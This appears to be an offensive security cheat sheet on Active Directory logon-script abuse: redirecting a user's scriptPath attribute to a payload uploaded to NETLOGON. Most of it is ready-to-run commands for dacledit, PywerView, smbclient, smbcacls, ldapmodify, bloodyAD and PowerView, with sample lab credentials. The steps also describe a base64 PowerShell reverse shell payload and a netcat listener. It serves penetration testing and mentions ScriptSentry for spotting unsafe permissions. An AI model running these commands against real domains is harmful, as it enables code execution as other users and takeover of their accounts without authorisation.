# 11.03 Logon Script Abuse scriptPath

> Redirect a target's `scriptPath` via `ldapmodify`/`bloodyAD`/PowerView to a payload in NETLOGON — runs as the user on next logon.

## Overview

With WriteProperty over a user's scriptPath attribute, an attacker can redirect their logon script to a malicious payload in NETLOGON. The attack involves confirming write access to a NETLOGON subfolder via smbcacls/icacls, uploading a payload .bat or .vbs file via smbclient, and then updating the scriptPath via ldapmodify, bloodyAD, or PowerView. On the next user logon, the payload executes as that user. Enumeration can be done with PywerView, dacledit, Adalanche, or ScriptSentry.

## Steps

- Enumerate ACEs with dacledit.py, PywerView get-objectacl, or PowerView Get-DomainObjectAcl to confirm ReadProperty/WriteProperty on Script-Path.
- List NETLOGON share contents with smbclient to find writable subdirectories.
- Use smbcacls (Linux) or icacls (Windows) to confirm write permissions on the target subdirectory.
- Create a base64-encoded PowerShell reverse shell payload and embed it in a .bat or .vbs file.
- Upload the payload with smbclient put into the writable NETLOGON subfolder.
- Update the user's scriptPath via ldapmodify (LDIF file), bloodyAD set object, or PowerView Set-DomainObject.
- Start a netcat listener; wait for the target user to log on to receive the shell.
- On Windows, use ScriptSentry (Invoke-ScriptSentry.ps1) to auto-detect unsafe logon script permissions and plaintext credentials.

## Commands

### Enumerate ACEs (dacledit Linux)

```bash
python3 examples/dacledit.py -principal 'david' -target 'eric' -dc-ip <TARGET> <DOMAIN>.local/'david':'SecurePassDav!d5'
```

### Enumerate ACEs (PywerView + jq filter)

```bash
pywerview get-objectacl --name 'eric' -w <DOMAIN>.local -t <TARGET> -u 'david' -p 'SecurePassDav!d5' --resolve-sids --resolve-guids --json | jq '.results | map(select(.securityidentifier | contains("david")))'
```

### List NETLOGON folders

```bash
smbclient //<TARGET>/NETLOGON -U david%'SecurePassDav!d5' -c "ls"
```

### Check ACL on NETLOGON subfolder

```bash
smbcacls //<TARGET>/NETLOGON /EricsScripts -U David%'SecurePassDav!d5'
```

### Upload payload to NETLOGON

```bash
smbclient //<TARGET>/NETLOGON --directory EricsScripts -U David%'SecurePassDav!d5' -c "put logonScript.bat"
```

### Update scriptPath via ldapmodify

```bash
ldapmodify -H ldap://<TARGET> -x -D '[email protected]' -w 'SecurePassDav!d5' -f logonScript.ldif
```

### Verify scriptPath update via ldapsearch

```bash
ldapsearch -LLL -H ldap://<TARGET> -x -D '[email protected]' -w 'SecurePassDav!d5' -b "DC=<DOMAIN>,DC=local" "(sAMAccountName=Eric)" scriptPath
```

### Update scriptPath via bloodyAD

```bash
bloodyAD --host "<TARGET>" -d "<DOMAIN>.local" -u "david" -p 'SecurePassDav!d5' set object eric scriptPath -v 'EricsScripts\logonScript.bat'
```

### Verify scriptPath via bloodyAD

```bash
bloodyAD --host "<TARGET>" -d "<DOMAIN>.local" -u "david" -p 'SecurePassDav!d5' get object eric --attr scriptPath
```

### Update scriptPath via PowerView

```powershell
Set-DomainObject eric -Set @{'scriptPath'='EricsScripts\logonScript.bat'}
```

### Verify scriptPath via PowerView

```powershell
Get-DomainObject eric -Properties scriptPath
```

### Enumerate ACEs (PowerView Windows)

```powershell
$DavidSID = (Get-DomainUser -Identity david).objectSID; Get-DomainObjectAcl -Identity eric -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $DavidSID}
```

### Check NETLOGON folder permissions (Windows)

```powershell
icacls $env:LOGONSERVER\NETLOGON\EricsScripts
```

### Run ScriptSentry

```powershell
.\Invoke-ScriptSentry.ps1
```
